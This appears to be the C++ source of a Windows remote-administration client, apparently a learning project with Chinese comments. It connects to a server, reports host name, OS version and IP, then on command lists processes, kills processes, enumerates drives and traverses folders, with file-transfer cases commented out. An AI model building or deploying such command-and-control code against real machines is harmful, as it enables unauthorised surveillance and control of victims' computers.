#include "ReC.h"


int main()
{
	InitSocket();
	InitNetWorkingInfo();
	SendInfoToServer(MSG_FUNCTION_CODE_NETWIRKING);
	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SocketThreadCallBack, NULL, NULL, NULL);
	WaitForSingleObject(hThread, -1);
	CleanSocket();
	//system("pause");
	return 0;
}

BOOL InitSocket()
{
	WORD wVersionRequested = MAKEWORD(2, 2);
	WSADATA lpWSAData;
	int nRet = WSAStartup(wVersionRequested, &lpWSAData);
	if (nRet != 0)
	{
		return FALSE;
	}
	if (LOBYTE(lpWSAData.wVersion) != 2 || HIBYTE(lpWSAData.wVersion) != 2)
	{
		WSACleanup();
		return FALSE;
	}
	SocketClient = socket(AF_INET, SOCK_STREAM, 0);//创建链接
	AddrServer.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");//任意IP
	AddrServer.sin_port = htons(8000);//端口
	AddrServer.sin_family = AF_INET;//设置家族

	connect(SocketClient, (sockaddr*)&AddrServer, sizeof(sockaddr));
	return TRUE;
}

BOOL CleanSocket()
{
	closesocket(SocketClient);
	WSACleanup();
	return TRUE;
}

BOOL InitNetWorkingInfo()
{
	memset(NetWorkingBuffer.szComputerName, 0, 30);
	memset(NetWorkingBuffer.szSystenVersion, 0, 30);
	memset(NetWorkingBuffer.szIntranetIP, 0, 20);
	NetWorkingBuffer.dwFuncCode = MSG_FUNCTION_CODE_NETWIRKING;
	GetSystemOSVersion(NetWorkingBuffer.szSystenVersion);
	char szHostName[128];
	int nRet = gethostname(szHostName, 128);
	if (nRet == 0)
	{
		wsprintf(NetWorkingBuffer.szComputerName, "%s", szHostName);
		hostent* pHost = gethostbyname(szHostName);
		for (size_t i = 0; pHost->h_addr_list[i] != NULL && pHost != NULL; i++)
		{
			char* szHostIP = inet_ntoa(*(in_addr*)pHost->h_addr_list[i]);
			wsprintf(NetWorkingBuffer.szIntranetIP, "%s", szHostIP);
			return TRUE;
		}
	}
	return FALSE;
}

BOOL GetSystemOSVersion(char* szBuffer)
{
	//Win10
	if (GetWinVer() == 10)
	{
		memcpy(szBuffer, "Windows 10", strlen("Windows 10"));
		return TRUE;
	}
	//Win8
	if (IsWindows8OrGreater())
	{
		memcpy(szBuffer, "Windows 8", strlen("Windows 8"));
		return TRUE;
	}
	//Win7
	if (IsWindows7OrGreater())
	{
		memcpy(szBuffer, "Windows 7", strlen("Windows 7"));
		return TRUE;
	}
	//xp
	if (IsWindowsXPOrGreater())
	{
		memcpy(szBuffer, "Windows XP", strlen("Windows XP"));
		return TRUE;
	}


	return 0;
}

DWORD GetWinVer()//Win8以上版本号获取
{
	HINSTANCE hinst = LoadLibrary("ntdll.dll");
	DWORD dwMajor, dwMinor, dwBuildNumber;
	NTPROC FnRtlGetNtVersionNumbers = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
	FnRtlGetNtVersionNumbers(&dwMajor, &dwMinor, &dwBuildNumber);
	dwBuildNumber &= 0xffff;
	//printf("OS:%d.%d.%d\n", dwMajor, dwMinor, dwBuildNumber);
	FreeLibrary(hinst);
	return dwMajor;
}

BOOL SendInfoToServer(DWORD dwCode)
{
	char opt = 1;
	setsockopt(SocketClient, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
	switch (dwCode)
	{
	case MSG_FUNCTION_CODE_NETWIRKING:
	{
		SendData((LPVOID)&NetWorkingBuffer, sizeof(NetWorkingBuffer));
		return TRUE;
	}
	case MSG_FUNCTION_CODE_GET_PROCESS_LIST:
	{
		NwSendData((LPVOID)&ProcessListBuffer, sizeof(ProcessListBuffer));
	}
	case MSG_FUNCTION_CODE_FILE_TRAVERSAL:
	{
		NwSendData((LPVOID)&DiskFileBuffer, sizeof(DiskFileBuffer));
		break;
	}
	case MSG_FUNCTION_CODE_GET_FILE_INFO:
	{
		NwSendData((LPVOID)&GetFileBuffer, sizeof(GetFileBuffer));
		break;
	}
	default:
		break;
	}
	return TRUE;
}

BOOL SocketThreadCallBack(LPVOID lpBuffer)
{
	while (true)
	{
		LPVOID lpBuffer = NULL;
		GetSocketData(&lpBuffer);
		//char Buffer[200] = {};
		//recv(socClient, Buffer, 200, 0);
		if (lpBuffer != NULL)
		{
			DWORD dwTemp = *(DWORD*)lpBuffer;
			switch (dwTemp)//分发
			{
			case MSG_FUNCTION_CODE_GET_PROCESS_LIST:
			{
				SendProcessList();
				break;
			}
			case MSG_FUNCTION_CODE_KEILL_PROCESS:
			{
				KillProcessInfo KillProcessBuffer = *(PKillProcessInfo)lpBuffer;
				KillProcess(KillProcessBuffer.dwProcessID);
				break;
			}
			case MSG_FUNCTION_CODE_DEIVE_LETTER:
			{
				GetDriver();
				break;
			}
			case MSG_FUNCTION_CODE_FILE_TRAVERSAL:
			{
				DiskFileInfo DFileInfo = *(PDiskFileInfo)lpBuffer;
				TraversalFiles(DFileInfo.szFilePath);
				break;
			}
			//case MSG_FUNCTION_CODE_GET_FILE_INFO:
			//{
			//	DWORD dwReadLength = 0;
			//	GetFileBuffer = *(PGetFileInfo)lpBuffer;
			//	HANDLE hFile = CreateFile(GetFileBuffer.szFilePath, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			//	dwFileSize = GetFileSize(hFile, NULL);
			//	szBuffer = new char[dwFileSize];
			//	ZeroMemory(szBuffer, dwFileSize);
			//	ReadFile(hFile, szBuffer, dwFileSize, &dwReadLength, NULL);
			//	GetFileBuffer.dwFuncCode = MSG_FUNCTION_CODE_GET_FILE_INFO;
			//	GetFileBuffer.dwFileSize = dwFileSize;
			//	SendInfoToServer(MSG_FUNCTION_CODE_GET_FILE_INFO);
			//	break;
			//}
			//case MSG_FUNCTION_CODE_GET_FILE:
			//{
			//	SendInfoToServer(MSG_FUNCTION_CODE_GET_FILE);
			//	break;
			//}
			//case MSG_FUNCTION_CODE_SEND_FILE:
			//{
			//	ZeroMemory(&GetFileBuffer, sizeof(GetFileBuffer));
			//	ZeroMemory(szFilePath, MAX_PATH);
			//	GetFileBuffer = *(PGetFileInfo)Buffer;
			//	memcpy(szFilePath, GetFileBuffer.szFilePath, strlen(GetFileBuffer.szFilePath));
			//	dwFileSize = GetFileBuffer.dwFileSize;
			//	szBuffer = new char[dwFileSize + 4];
			//	memset(szBuffer, 0, dwFileSize + 4);
			//	SendInfoToServer(MSG_FUNCTION_CODE_SEND_FILE);
			//	break;
			//}
			default:
				break;
			}
		}
	}
}

BOOL TraversalFiles(PCHAR pcPath)
{

	CHAR FindPath[MAX_PATH];

	strcpy_s(FindPath, pcPath);
	strcat_s(FindPath, "*");
	WIN32_FIND_DATA WFDFileInfo;
	HANDLE hFile = FindFirstFile(FindPath, &WFDFileInfo);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			CHAR IndexPath[MAX_PATH];
			strcpy_s(IndexPath, pcPath);
			strcat_s(IndexPath, WFDFileInfo.cFileName);
			strcpy_s(DiskFileBuffer.szFilePath, WFDFileInfo.cFileName);
			SHGetFileInfo(IndexPath, 0, &(DiskFileBuffer.FileInfo), sizeof(DiskFileBuffer.FileInfo), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
			DiskFileBuffer.dwFuncCode = MSG_FUNCTION_CODE_FILE_TRAVERSAL;
			SendInfoToServer(MSG_FUNCTION_CODE_FILE_TRAVERSAL);
		} while (FindNextFile(hFile, &WFDFileInfo));
	}
	return FindClose(hFile);
}

BOOL GetDriver()
{
	for (WCHAR i = 'A'; i < 'Z'; i++)
	{
		memset(&DriveLetterBuffer, 0, sizeof(DriveLetterBuffer));
		char szTemp[4] = { i,':','\\','\0' };
		char szDriver[4] = { i,':','\0' };
		wsprintf(DriveLetterBuffer.szDisk, szDriver, strlen(szDriver));
		UINT uType = GetDriveType(szTemp);
		switch (uType)
		{
		case DRIVE_FIXED:
		{
			wsprintf(DriveLetterBuffer.szDiskType, "硬盘", strlen("硬盘"));
			break;
		}
		case DRIVE_CDROM:
		{
			wsprintf(DriveLetterBuffer.szDiskType, "光盘", strlen("光盘"));
			break;
		}
		case DRIVE_REMOTE:
		{
			wsprintf(DriveLetterBuffer.szDiskType, "移动硬盘", strlen("移动硬盘"));
			break;
		}
		default:
			continue;
		}
		SHGetFileInfo(DriveLetterBuffer.szDisk, 0, &(DriveLetterBuffer.FileInfo), sizeof(DriveLetterBuffer.FileInfo), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
		DriveLetterBuffer.dwFuncCode = MSG_FUNCTION_CODE_DEIVE_LETTER;
		SendInfoToServer(MSG_FUNCTION_CODE_DEIVE_LETTER);
	}

	return 0;
}

BOOL KillProcess(DWORD dwProcessID)
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
	TerminateProcess(hProcess, 0);
	CloseHandle(hProcess);
	return TRUE;

}

BOOL SendProcessList()
{
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 PE32 = { sizeof(PROCESSENTRY32) };
	while (Process32Next(hSnap, &PE32))
	{
		memset(ProcessListBuffer.szProcessName, 0, 128);
		memset(ProcessListBuffer.szProcessPath, 0, MAX_PATH);
		ProcessListBuffer.dwFuncCode = MSG_FUNCTION_CODE_GET_PROCESS_LIST;
		ProcessListBuffer.dwProcessID = PE32.th32ProcessID;
		ProcessListBuffer.dwParenProcessID = PE32.th32ParentProcessID;
		memcpy(ProcessListBuffer.szProcessName, PE32.szExeFile, strlen(PE32.szExeFile));
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PE32.th32ProcessID);
		if (hProcess == NULL)
		{
			memcpy(ProcessListBuffer.szProcessPath, "Get Path Failed", strlen("Get Path Failed"));
			SendInfoToServer(MSG_FUNCTION_CODE_GET_PROCESS_LIST);
		}
		else
		{
			GetModuleFileNameExA(hProcess, NULL, ProcessListBuffer.szProcessPath, MAX_PATH);
			SendInfoToServer(MSG_FUNCTION_CODE_GET_PROCESS_LIST);
		}
	}
	return FALSE;
}

//动态发送数据
VOID SendData(LPVOID lpSendBuffer, DWORD64 dwBufferLength)
{
	send(SocketClient, (char*)&dwBufferLength, sizeof(DWORD64), 0);
	send(SocketClient, (char*)lpSendBuffer, dwBufferLength, 0);
	return;
}

VOID NwSendData(LPVOID lpSendBuffer,DWORD64 dwBufferLength)
{
	SOCKET TempSock = socket(AF_INET, SOCK_STREAM, 0);
	connect(TempSock, (sockaddr*)&AddrServer, sizeof(sockaddr));
	send(TempSock, (char*)&dwBufferLength, sizeof(DWORD64), 0);
	send(TempSock, (char*)lpSendBuffer, dwBufferLength, 0);
	closesocket(TempSock);
	return;
}

//动态接收数据
DWORD GetSocketData(LPVOID* lpRetFileBuffer)
{
	DWORD64 dwRetFileLength = 0;
	recv(SocketClient, (PCHAR)&dwRetFileLength, sizeof(DWORD64), 0);
	*lpRetFileBuffer = malloc(dwRetFileLength);
	ZeroMemory(*lpRetFileBuffer, dwRetFileLength);
	recv(SocketClient, (PCHAR)*lpRetFileBuffer, dwRetFileLength, 0);
	return dwRetFileLength;
}



